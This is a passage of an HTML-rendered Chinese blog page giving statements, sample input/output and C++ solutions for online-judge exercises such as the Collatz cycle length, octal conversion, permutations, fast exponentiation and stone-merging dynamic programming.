i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;m;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(search(ca1[i],key1[j]))</span><br><span class="line">                    num++;</span><br><span class="line">                <span class="comment">//cout&lt;&lt;search(ca1[i],key1[j])&lt;&lt;endl;</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(num&gt;k)</span><br><span class="line">            &#123;</span><br><span class="line">                k=num;</span><br><span class="line">                local=i;</span><br><span class="line">            &#125;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//cout&lt;&lt;local&lt;&lt;endl;</span></span><br><span class="line">        <span class="comment">//cout&lt;&lt;k&lt;&lt;endl;</span></span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ca[local]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-小雏鸟的计算"><a href="#问题-D-小雏鸟的计算" class="headerlink" title="问题 D: 小雏鸟的计算"></a>问题 D: 小雏鸟的计算</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>小雏鸟们的三角形翅膀终于长出健壮的肌肉和丰满的羽毛，已经跃跃欲试的去准备尝试挑战新的难题了。</p><p>考虑以下的算法：<br>\1.     输入 n<br>\2.     印出 n<br>\3.     如果 n = 1 结束<br>\4.     如果 n 是奇数 那么 n=3*n+1<br>\5.     否则 n=n/2<br>\6.     GOTO 2<br>例如输入 22 得到的数列： 22 11 34 17 52 26 13 40 20 10 5 16 8 4 2 1<br>据推测此算法对任何整数而言会终止 (当打印出 1 的时候)。虽然此算法很简单，但以上的推测是否真实却无法知道。然而对所有的n ( 0 &lt; n &lt; 1000000 )来说，以上的推测已经被验证是正确的。<br>给一个输入 n 透过以上的算法我们可以得到一个数列（1作为结尾）。此数列的长度称为n的cycle length。上面提到的例子 22的 cycle length为 16.<br>问题来了：对任2个整数i，j我们想要知道介于i，j（包含i，j）之间的数所产生的数列中最大的cycle length是多少。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>输入可能包含了好几行测试数据，每一行有一对整数 i，j 。 </p><p>0&lt; i，j &lt; 1000000</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>对每一对输入 i j你应该要输出 i j和介于i j之间的数所产生的数列中最大的cycle length。</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 10</span><br><span class="line">10 1</span><br><span class="line">100 200</span><br><span class="line">201 210</span><br><span class="line">900 1000</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1 10 20</span><br><span class="line">10 1 20</span><br><span class="line">100 200 125</span><br><span class="line">201 210 89</span><br><span class="line">900 1000 174</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">test</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n!=<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">            n=<span class="number">3</span>*n+<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            n=n/<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    count++;</span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;i&gt;&gt;j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;i&lt;&lt;<span class="string">" "</span>&lt;&lt;j&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(i&gt;j)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> m;</span><br><span class="line">            m=i;</span><br><span class="line">            i=j;</span><br><span class="line">            j=m;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=i;k&lt;=j;k++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(test(k)&gt;max)</span><br><span class="line">                max=test(k);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;max&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-进制转换"><a href="#问题-E-进制转换" class="headerlink" title="问题 E: 进制转换"></a>问题 E: 进制转换</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>输入一个十进制正整数，然后输出它所对应的八进制数。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>输入一个十进制正整数n(1≤n≤10<sup>6</sup>) 。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>输出n对应的八进制数，输出在一行。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">12</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stack&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">transform</span><span class="params">(<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">stack</span> &lt;<span class="keyword">int</span>&gt; stk;</span><br><span class="line">    <span class="keyword">while</span>(x!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        stk.push(x%<span class="number">8</span>);</span><br><span class="line">        x=x/<span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(!stk.empty())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;stk.top();</span><br><span class="line">        stk.pop();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    transform(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-F-排列问题"><a href="#问题-F-排列问题" class="headerlink" title="问题 F: 排列问题"></a>问题 F: 排列问题</h2><h3 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h3><p>  输入一个可能含有重复字符的字符串，打印出该字符串中所有字符的全排列。</p><h3 id="输入-5"><a href="#输入-5" class="headerlink" title="输入"></a>输入</h3><p>单组测试数据，输入数据是一个长度不超过10个字符的字符串，以逗号结尾。</p><h3 id="输出-5"><a href="#输出-5" class="headerlink" title="输出"></a>输出</h3><p>打印出该字符串中所有字符的全排列。以字典序顺序输出，用空格分隔。</p><h3 id="样例输入-5"><a href="#样例输入-5" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc,</span><br></pre></td></tr></table></figure><h3 id="样例输出-5"><a href="#样例输出-5" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abc acb bac bca cab cba</span><br></pre></td></tr></table></figure><h3 id="提示-5"><a href="#提示-5" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-5"><a href="#代码-5" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;  </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="built_in">string</span> str;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; str;  </span><br><span class="line">    str = str.substr(<span class="number">0</span>, str.length() - <span class="number">1</span>);</span><br><span class="line">    sort(str.begin(),str.end());</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; str &lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;<span class="keyword">while</span>(next_permutation(str.begin(),str.end()));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-G-快速幂"><a href="#问题-G-快速幂" class="headerlink" title="问题 G: 快速幂"></a>问题 G: 快速幂</h2><h3 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="http://192.168.173.163/JudgeOnline/upload/image/20180914/20180914130647_85638.png" alt="img"></p><h3 id="输入-6"><a href="#输入-6" class="headerlink" title="输入"></a>输入</h3><p>多组测试样例，最多50组。每组测试样例给定一个整数x(1&lt;=x&lt;=25000)</p><h3 id="输出-6"><a href="#输出-6" class="headerlink" title="输出"></a>输出</h3><p>对每个样例，输出一行，代表f(x)对100000007取余的结果。</p><h3 id="样例输入-6"><a href="#样例输入-6" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="样例输出-6"><a href="#样例输出-6" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">33</span><br><span class="line">289</span><br><span class="line">3414</span><br></pre></td></tr></table></figure><h3 id="提示-6"><a href="#提示-6" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-6"><a href="#代码-6" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> n=<span class="number">100000007</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">poww</span><span class="params">(<span class="keyword">long</span> <span class="keyword">long</span> a, <span class="keyword">long</span> <span class="keyword">long</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (b)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (b &amp; <span class="number">1</span> != <span class="number">0</span>)</span><br><span class="line">            ans=ans*a%n;</span><br><span class="line">        a=a*a%n;</span><br><span class="line">        b &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> n=<span class="number">100000007</span>;</span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;x)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> sum=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=x;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=(poww(i,i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;(sum+<span class="number">1</span>)%n&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-H-求第k小"><a href="#问题-H-求第k小" class="headerlink" title="问题 H: 求第k小"></a>问题 H: 求第k小</h2><h3 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n(1&lt;=n&lt;=1000000)个元素，求第k小数(1&lt;=k&lt;=n)。</p><h3 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h3><p>一组样例。第一行输入两个整数n和k。第二行输入n个不同的int范围内的数。</p><h3 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h3><p>输出一行，输出第k小数。</p><h3 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">5 2</span><br><span class="line">1 5 3 2 4</span><br></pre></td></tr></table></figure><h3 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="提示-7"><a href="#提示-7" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-7"><a href="#代码-7" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">1000010</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,k;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    sort(a,a+n);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;a[k<span class="number">-1</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-I-沙子的质量"><a href="#问题-I-沙子的质量" class="headerlink" title="问题 I: 沙子的质量"></a>问题 I: 沙子的质量</h2><h3 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h3><p>设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。</p><h3 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h3><p>第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。</p><h3 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h3><p>合并的最小代价。</p><h3 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 3 5 2</span><br></pre></td></tr></table></figure><h3 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure><h3 id="提示-8"><a href="#提示-8" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-8"><a href="#代码-8" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">305</span>];</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">305</span>][<span class="number">305</span>]; <span class="comment">//合并a堆到b堆的最小代价 </span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">127</span>/<span class="number">3</span>,<span class="keyword">sizeof</span>(f)); <span class="comment">//初始化为一个较大值，注意memset的用法！ </span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line">        num[i]+=num[i<span class="number">-1</span>];</span><br><span class="line">        f[i][i]=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;=n; i++) <span class="comment">//求1到i堆的最小代价 </span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>; j&gt;=<span class="number">1</span>; j--) <span class="comment">//求j到i堆的最小代价 </span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=j; k&lt;=i; k++) <span class="comment">//找到j到i堆的最小代价 </span></span><br><span class="line">            &#123;</span><br><span class="line">                f[j][i]=min(f[j][i],f[j][k]+f[k+<span class="number">1</span>][i]+num[i]-num[j<span class="number">-1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;f[<span class="number">1</span>][n];</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-J-最长公共子序列"><a href="#问题-J-最长公共子序列" class="headerlink" title="问题 J: 最长公共子序列"></a>问题 J: 最长公共子序列</h2><h3 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h3><p>一个字符串A的子串被定义成从A中顺次选出若干个字符构成的串。如A=“cdaad” ,顺次选1，3，5个字符就构成子串” cad” ,现给定两个字符串，求它们的最长共公子串。</p><h3 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h3><p>第一行两个字符串用空格分开。两个串的长度均小于2000 。</p><h3 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h3><p>最长子串的长度。</p><h3 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abccd aecd</span><br></pre></td></tr></table></figure><h3 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure><h3 id="提示-9"><a href="#提示-9" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-9"><a href="#代码-9" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maxx</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (a&gt;=b)  <span class="keyword">return</span> a;</span><br><span class="line">    <span class="keyword">return</span> b; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span 